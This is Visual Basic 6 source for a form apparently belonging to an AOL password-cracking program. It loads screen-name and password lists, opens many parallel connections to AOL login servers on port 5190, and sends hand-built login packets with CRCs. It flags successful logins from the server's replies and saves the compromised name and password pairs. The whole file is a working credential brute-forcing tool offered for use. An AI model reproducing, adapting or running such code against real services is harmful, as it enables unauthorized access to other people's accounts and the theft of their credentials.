VERSION 5.00
Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "mscomctl.ocx"
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "mswinsck.ocx"
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "comdlg32.ocx"
Begin VB.Form Form3 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Password Cracker"
   ClientHeight    =   3885
   ClientLeft      =   45
   ClientTop       =   435
   ClientWidth     =   3915
   Icon            =   "cracker.frx":0000
   LinkTopic       =   "Form3"
   MaxButton       =   0   'False
   MDIChild        =   -1  'True
   ScaleHeight     =   3885
   ScaleWidth      =   3915
   Begin VB.TextBox Text1 
      Height          =   1455
      Left            =   0
      Locked          =   -1  'True
      MultiLine       =   -1  'True
      ScrollBars      =   3  'Both
      TabIndex        =   27
      Top             =   1920
      Width           =   3855
   End
   Begin MSComDlg.CommonDialog CommonDialog1 
      Left            =   480
      Top             =   0
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock1 
      Index           =   0
      Left            =   0
      Top             =   0
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSComctlLib.ProgressBar ProgressBar1 
      Align           =   2  'Align Bottom
      Height          =   255
      Left            =   0
      TabIndex        =   12
      Top             =   3375
      Width           =   3915
      _ExtentX        =   6906
      _ExtentY        =   450
      _Version        =   393216
      Appearance      =   1
      Scrolling       =   1
   End
   Begin MSComctlLib.StatusBar StatusBar1 
      Align           =   2  'Align Bottom
      Height          =   255
      Left            =   0
      TabIndex        =   11
      Top             =   3630
      Width           =   3915
      _ExtentX        =   6906
      _ExtentY        =   450
      _Version        =   393216
      BeginProperty Panels {8E3867A5-8586-11D1-B16A-00C0F0283628} 
         NumPanels       =   3
         BeginProperty Panel1 {8E3867AB-8586-11D1-B16A-00C0F0283628} 
            AutoSize        =   1
         EndProperty
         BeginProperty Panel2 {8E3867AB-8586-11D1-B16A-00C0F0283628} 
            AutoSize        =   1
         EndProperty
         BeginProperty Panel3 {8E3867AB-8586-11D1-B16A-00C0F0283628} 
            AutoSize        =   1
         EndProperty
      EndProperty
   End
   Begin VB.Frame Frame1 
      Caption         =   "Screen Names"
      Height          =   975
      Index           =   0
      Left            =   0
      TabIndex        =   9
      Top             =   0
      Width           =   1935
      Begin VB.CommandButton Command6 
         Caption         =   "Load"
         Height          =   255
         Index           =   0
         Left            =   1320
         TabIndex        =   7
         TabStop         =   0   'False
         ToolTipText     =   "Load List"
         Top             =   600
         Width           =   495
      End
      Begin VB.CommandButton Command5 
         Caption         =   "Save"
         Height          =   255
         Index           =   0
         Left            =   840
         TabIndex        =   6
         TabStop         =   0   'False
         ToolTipText     =   "Save List"
         Top             =   600
         Width           =   495
      End
      Begin VB.ComboBox Combo1 
         Height          =   315
         Index           =   0
         Left            =   120
         Style           =   2  'Dropdown List
         TabIndex        =   3
         TabStop         =   0   'False
         Top             =   240
         Width           =   1695
      End
      Begin VB.CommandButton Command7 
         Caption         =   "C"
         Height          =   255
         Index           =   0
         Left            =   600
         TabIndex        =   16
         TabStop         =   0   'False
         ToolTipText     =   "Clear List"
         Top             =   600
         Width           =   255
      End
      Begin VB.CommandButton Command4 
         Caption         =   "-"
         Height          =   255
         Index           =   0
         Left            =   360
         TabIndex        =   5
         TabStop         =   0   'False
         ToolTipText     =   "Remove Item"
         Top             =   600
         Width           =   255
      End
      Begin VB.CommandButton Command3 
         Caption         =   "+"
         Height          =   255
         Index           =   0
         Left            =   120
         TabIndex        =   4
         TabStop         =   0   'False
         ToolTipText     =   "Add Item"
         Top             =   600
         Width           =   255
      End
   End
   Begin VB.Frame Frame1 
      Caption         =   "Passwords"
      Height          =   975
      Index           =   1
      Left            =   1920
      TabIndex        =   10
      Top             =   0
      Width           =   1935
      Begin VB.ComboBox Combo1 
         Height          =   315
         Index           =   1
         Left            =   120
         Style           =   2  'Dropdown List
         TabIndex        =   8
         TabStop         =   0   'False
         Top             =   240
         Width           =   1695
      End
      Begin VB.CommandButton Command6 
         Caption         =   "Load"
         Height          =   255
         Index           =   1
         Left            =   1320
         TabIndex        =   17
         TabStop         =   0   'False
         ToolTipText     =   "Load List"
         Top             =   600
         Width           =   495
      End
      Begin VB.CommandButton Command5 
         Caption         =   "Save"
         Height          =   255
         Index           =   1
         Left            =   840
         TabIndex        =   18
         TabStop         =   0   'False
         ToolTipText     =   "Save List"
         Top             =   600
         Width           =   495
      End
      Begin VB.CommandButton Command7 
         Caption         =   "C"
         Height          =   255
         Index           =   1
         Left            =   600
         TabIndex        =   19
         TabStop         =   0   'False
         ToolTipText     =   "Clear List"
         Top             =   600
         Width           =   255
      End
      Begin VB.CommandButton Command4 
         Caption         =   "-"
         Height          =   255
         Index           =   1
         Left            =   360
         TabIndex        =   20
         TabStop         =   0   'False
         ToolTipText     =   "Remove Item"
         Top             =   600
         Width           =   255
      End
      Begin VB.CommandButton Command3 
         Caption         =   "+"
         Height          =   255
         Index           =   1
         Left            =   120
         TabIndex        =   21
         TabStop         =   0   'False
         ToolTipText     =   "Add Item"
         Top             =   600
         Width           =   255
      End
   End
   Begin VB.Frame Frame1 
      Caption         =   "BERP Servers"
      Height          =   975
      Index           =   2
      Left            =   0
      TabIndex        =   13
      Top             =   960
      Width           =   1935
      Begin VB.ComboBox Combo1 
         Height          =   315
         Index           =   2
         Left            =   120
         Style           =   2  'Dropdown List
         TabIndex        =   14
         TabStop         =   0   'False
         Top             =   240
         Width           =   1695
      End
      Begin VB.CommandButton Command6 
         Caption         =   "Load"
         Height          =   255
         Index           =   2
         Left            =   1320
         TabIndex        =   22
         TabStop         =   0   'False
         ToolTipText     =   "Load List"
         Top             =   600
         Width           =   495
      End
      Begin VB.CommandButton Command5 
         Caption         =   "Save"
         Height          =   255
         Index           =   2
         Left            =   840
         TabIndex        =   23
         TabStop         =   0   'False
         ToolTipText     =   "Save List"
         Top             =   600
         Width           =   495
      End
      Begin VB.CommandButton Command7 
         Caption         =   "C"
         Height          =   255
         Index           =   2
         Left            =   600
         TabIndex        =   24
         TabStop         =   0   'False
         ToolTipText     =   "Clear List"
         Top             =   600
         Width           =   255
      End
      Begin VB.CommandButton Command4 
         Caption         =   "-"
         Height          =   255
         Index           =   2
         Left            =   360
         TabIndex        =   25
         TabStop         =   0   'False
         ToolTipText     =   "Remove Item"
         Top             =   600
         Width           =   255
      End
      Begin VB.CommandButton Command3 
         Caption         =   "+"
         Height          =   255
         Index           =   2
         Left            =   120
         TabIndex        =   26
         TabStop         =   0   'False
         ToolTipText     =   "Add Item"
         Top             =   600
         Width           =   255
      End
   End
   Begin VB.Frame Frame2 
      Caption         =   "Controls"
      Height          =   975
      Left            =   1920
      TabIndex        =   15
      Top             =   960
      Width           =   1935
      Begin VB.CommandButton Command2 
         Caption         =   "BERP Scanner"
         Height          =   255
         Left            =   120
         TabIndex        =   2
         Top             =   600
         Width           =   1695
      End
      Begin VB.CommandButton Command8 
         Caption         =   "Exit"
         Height          =   375
         Left            =   960
         TabIndex        =   1
         Top             =   240
         Width           =   855
      End
      Begin VB.CommandButton Command1 
         Caption         =   "Crack"
         Height          =   375
         Left            =   120
         TabIndex        =   0
         Top             =   240
         Width           =   855
      End
   End
End
Attribute VB_Name = "Form3"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim BERPIndex As Long, CurPassword(20) As String, StopIt As Boolean

Private Sub Command1_Click()
      On Error Resume Next
      Dim x As Long, y As Long
      Select Case Command1.Caption
            Case "Crack"
                  BERPIndex = 0
                  StopIt = False
                  If Combo1(2).ListCount = 0 Then Combo1(2).AddItem "americaOnline.aol.com"
                  If Combo1(0).ListCount = 0 Then MsgBox "Must Have a screen name list": Exit Sub
                  If Combo1(1).ListCount = 0 Then MsgBox "Must Have a password list": Exit Sub
                  Command1.Caption = "Stop"
                  For x = 3 To 4
                        Load Combo1(x)
                        Combo1(x).Clear
                        For y = 0 To Combo1(x - 3).ListCount - 1
                              Combo1(x).AddItem Combo1(x - 3).List(y)
                        DoEvents
                        Next
                  Next
                  ProgressBar1.Max = Combo1(3).ListCount * Combo1(4).ListCount
                  For x = 1 To UBound(CurPassword)
                        Load Winsock1(x)
                        Winsock1_Close (x)
                        DoEvents
                        'TimeOut 1
                  Next
            Case "Stop"
                  StopIt = True
                  Command1.Caption = "Crack"
                  ProgressBar1.Value = 0
      End Select
End Sub

Private Sub Command2_Click()
      Form2.Show
      Form2.SetFocus
End Sub

Private Sub Command3_Click(Index As Integer)
      Dim x As Long, AddIt As Boolean
      Dim Data As String
      Combo1(Index).SetFocus
      Do
            Data = InputBox("Please enter a " & Mid(Frame1(Index).Caption, 1, Len(Frame1(Index).Caption) - 1), "Ultimate Cracking Utility", , (Me.Left + MDIForm1.Left + Me.Width) / 2, (Me.Top + MDIForm1.Top + Me.Height) / 2)
            If Not LCase(Replace(Data, " ", "")) = "" Then
                  AddIt = True
                  For x = 0 To Combo1(Index).ListCount - 1
                        If LCase(Replace(Combo1(Index).List(x), " ", "")) = LCase(Replace(Data, " ", "")) Then AddIt = False
                  Next
                  If AddIt = True Then Combo1(Index).AddItem LCase(Replace(Data, " ", ""))
            End If
      Loop Until Data = ""
      If Combo1(Index).ListCount > 0 Then Combo1(Index).ListIndex = 0
End Sub

Private Sub Command3_MouseUp(Index As Integer, Button As Integer, Shift As Integer, x As Single, y As Single)
      Combo1(Index).SetFocus
End Sub

Private Sub Command4_Click(Index As Integer)
      Combo1(Index).SetFocus
      If Combo1(Index).ListIndex < 0 Then Exit Sub
      Select Case MsgBox("Are you sure you wish to delete " & Combo1(Index).Text, vbYesNo, "Ultimate Cracking Utility")
            Case vbYes
                  Combo1(Index).RemoveItem Combo1(Index).ListIndex
            Case vbNo
                  'do nothing
      End Select
      If Combo1(Index).ListCount > 0 Then Combo1(Index).ListIndex = 0
End Sub

Private Sub Command4_MouseUp(Index As Integer, Button As Integer, Shift As Integer, x As Single, y As Single)
      Combo1(Index).SetFocus
End Sub

Private Sub Command5_Click(Index As Integer)
      On Error Resume Next
      Dim x As Long
      Combo1(Index).SetFocus
      CommonDialog1.FileName = ""
      CommonDialog1.ShowSave
      If CommonDialog1.FileName = "" Then Exit Sub
      ProgressBar1.Max = Combo1(Index).ListCount - 1
      StatusBar1.Panels(3).Text = "Saving..."
      Open CommonDialog1.FileName For Output As #1
            For x = 0 To Combo1(Index).ListCount - 1
                  Print #1, Combo1(Index).List(x)
                  ProgressBar1.Value = x
                  DoEvents
            Next
      Close #1
      ProgressBar1.Value = 0
      StatusBar1.Panels(3).Text = "Complete"
End Sub

Private Sub Command5_MouseUp(Index As Integer, Button As Integer, Shift As Integer, x As Single, y As Single)
      Combo1(Index).SetFocus
End Sub

Private Sub Command6_Click(Index As Integer)
      On Error Resume Next
      Dim x As Long, Data As String, AddIt As Boolean
      Combo1(Index).SetFocus
      CommonDialog1.FileName = ""
      CommonDialog1.ShowOpen
      If CommonDialog1.FileName = "" Then Exit Sub
      ProgressBar1.Max = FileLen(CommonDialog1.FileName)
      StatusBar1.Panels(3).Text = "Loading..."
      Open CommonDialog1.FileName For Input As #1
            Do
                  Input #1, Data
                  AddIt = True
                  For x = 0 To Combo1(Index).ListCount - 1
                        If LCase(Replace(Data, " ", "")) = LCase(Replace(Combo1(Index).List(x), " ", "")) Then AddIt = False
                  Next
                  If AddIt = True Then Combo1(Index).AddItem Data
                  DoEvents
                  ProgressBar1.Value = ProgressBar1.Value + Len(Data) + 2
            Loop Until EOF(1)
      Close #1
      ProgressBar1.Value = 0
      StatusBar1.Panels(3).Text = "Complete"
      If Combo1(Index).ListCount > 0 Then Combo1(Index).ListIndex = 0
End Sub


Private Sub Command6_MouseUp(Index As Integer, Button As Integer, Shift As Integer, x As Single, y As Single)
      Combo1(Index).SetFocus
End Sub

Private Sub Command7_Click(Index As Integer)
      Combo1(Index).SetFocus
      Select Case MsgBox("Are you sure you want to clear " & Frame1(Index).Caption & " list?", vbYesNo)
            Case vbYes
                  Combo1(Index).Clear
            Case vbNo
                  'do nothing
      End Select
      
End Sub

Private Sub Command7_MouseUp(Index As Integer, Button As Integer, Shift As Integer, x As Single, y As Single)
      Combo1(Index).SetFocus
End Sub

Private Sub Command8_Click()
      Unload Me
End Sub

Private Sub Form_Unload(Cancel As Integer)
      If MDIForm1.MyCancel = True Then
            Cancel = 0
      Else
            Cancel = 1
            Me.Visible = False
      End If
      StopIt = True
      Command1.Caption = "Crack"

End Sub

Private Sub Winsock1_Close(Index As Integer)
      Dim x As Long
      If Combo1(3).ListCount = 0 Then StopIt = True
      If Combo1(4).ListCount = 0 Then
            For x = 0 To Combo1(1).ListCount - 1
                  Combo1(4).AddItem Combo1(1).List(x)
            Next
            Combo1(3).RemoveItem 0
      End If
      If StopIt = True Then Exit Sub
      StatusBar1.Panels(1).Text = Combo1(3).List(0)
      StatusBar1.Panels(2).Text = Combo1(4).List(0)
      CurPassword(Index) = Combo1(4).List(0)
      Combo1(4).RemoveItem 0
      Winsock1(Index).Close
      Winsock1(Index).Connect Combo1(2).List(BERPIndex), 5190
      BERPIndex = BERPIndex + 1
      If BERPIndex = Combo1(2).ListCount - 1 Then BERPIndex = 0
      ProgressBar1.Value = ProgressBar1.Value + 1
End Sub

Private Sub Winsock1_Connect(Index As Integer)
      Winsock1(Index).SendData DeHex("5A413800347F7FA3036B0100F5000000050F00002152CBCA070A1000080400000000035F0000010004000300080000000000000000000000020D")
      If StopIt = True Then Winsock1_Close (Index)
      Text1 = Text1 & "connected to:" & Winsock1(Index).RemoteHost & vbNewLine
      Text1.SelStart = Len(Text1)
End Sub

Private Sub Winsock1_DataArrival(Index As Integer, ByVal bytesTotal As Long)
      Dim SData As String, NewItem As MSComctlLib.ListItem
      Dim Ping6 As String, Ping7 As String, Packet As String
      Dim CRC1 As Long, TheHi As String, TheLo As String
      Dim ScreenName1 As String, Password1 As String, Fifth As String
      Dim Crap As Integer, x As Long
      If StopIt = True Then Winsock1_Close (Index)
      Winsock1(Index).GetData SData
      'Text1 = Text1 & SData & vbNewLine
      'connected
      If Len(SData) = 9 Then
            Ping6$ = Mid(SData, 6, 1)
            Ping7$ = Mid(SData, 7, 1)
            Packet$ = DeHex("0003" & EnHex(Ping7$) & EnHex(Ping6$) & "A40D")
            CRC1 = AOLCRC(Packet$, Len(Packet$) - 1)
            TheHi$ = Chr(GetHiByte(CRC1))
            TheLo$ = Chr(GetLoByte(CRC1))
            Winsock1(Index).SendData DeHex("5A" & EnHex(TheHi$) & EnHex(TheLo$) & EnHex(Packet$))
            Text1 = Text1 & "data" & vbNewLine
      End If
      'remove crap
      Crap = 1
      Do Until Crap = 0
            Crap = InStr(1, SData, Chr$(0))
            If Crap > 0 Then Mid(SData, Crap, 1) = "�"
      Loop
      'invalid password
      If InStr(1, SData, "Invalid password") Then
            Text1 = Text1 & "invalid password" & vbNewLine
            Winsock1_Close (Index)
      End If
      'invalid account
      If InStr(1, SData, "Invalid account") Then
            Combo1(3).RemoveItem 0
            Text1 = Text1 & "invalid account" & vbNewLine
            GoTo LoadPWList
            Winsock1_Close (Index)
      End If
      'only one screen name online at a time  &  its a good password
      If InStr(1, SData, "Only one") Then
            Form1.Show
            Set NewItem = Form1.ListView1.ListItems.Add(, , Combo1(3).List(0))
            NewItem.SubItems(1) = CurPassword(Index)
            Combo1(3).RemoveItem 0
            Text1 = Text1 & "only one name on at a time" & vbNewLine
            GoTo LoadPWList
            Winsock1_Close (Index)
      End If
      'send screen name and password
      If InStr(1, SData, "SD") Then
            ScreenName1$ = Int2Hex(Len(Combo1(3).List(0)) + 1) & EnHex(Combo1(3).List(0))
            Password1$ = Int2Hex(Len(CurPassword(Index))) & EnHex(CurPassword(Index))
            Fifth$ = Give5th("5AD69400411010A044640015000100010A0400000001010B04000000010301" & ScreenName1$ & "20011D00011D00010A04000000020301" & Password1$ & "011D000002000D", 2)
            Packet$ = DeHex("00" & Fifth$ & "1010A044640015000100010A0400000001010B04000000010301" & ScreenName1$ & "20011D00011D00010A04000000020301" & Password1$ & "011D000002000D")
            CRC1 = AOLCRC(Packet$, Len(Packet$) - 1)
            TheHi$ = Chr(GetHiByte(CRC1))
            TheLo$ = Chr(GetLoByte(CRC1))
            Winsock1(Index).SendData DeHex("5A" & EnHex(TheHi$) & EnHex(TheLo$) & "00" & Fifth$ & "1010A044640015000100010A0400000001010B04000000010301" & ScreenName1$ & "20011D00011D00010A04000000020301" & Password1$ & "011D000002000D")
            Winsock1(Index).SendData DeHex("5A3A0A00031018A40D")
            Text1 = Text1 & "trying screen name:" & Combo1(3).List(0) & " and password:" & CurPassword(Index) & vbNewLine
      End If
      'its a good password
      If InStr(1, SData, "Master Tool") Then
            'Winsock1(Index).SendData DeHex("5A3A0A00031018A40D5AC6910008111CA079610701010D5A5C340022121CA0746C00170001000A0F04007BB5E80A10041DA6DDF20A4504000000070002000D5A6F4A000D131CA0534300150001000002000D")
            Form1.Show
            Set NewItem = Form1.ListView1.ListItems.Add(, , Combo1(3).List(0))
            NewItem.SubItems(1) = CurPassword(Index)
            Combo1(3).RemoveItem 0
            Text1 = Text1 & "good password" & vbNewLine
            GoTo LoadPWList
            Winsock1_Close (Index)
      End If
      Text1.SelStart = Len(Text1)
      Exit Sub
LoadPWList:
      For x = 0 To Combo1(1).ListCount - 1
            Combo1(4).AddItem Combo1(1).List(x)
      Next
      'need to read all the password to the combo1(4) box after its done with each screen name
End Sub

Private Sub Winsock1_Error(Index As Integer, ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
      Combo1(4).AddItem CurPassword(Index)
      ProgressBar1.Value = ProgressBar1.Value - 1
      Winsock1_Close (Index)
End Sub
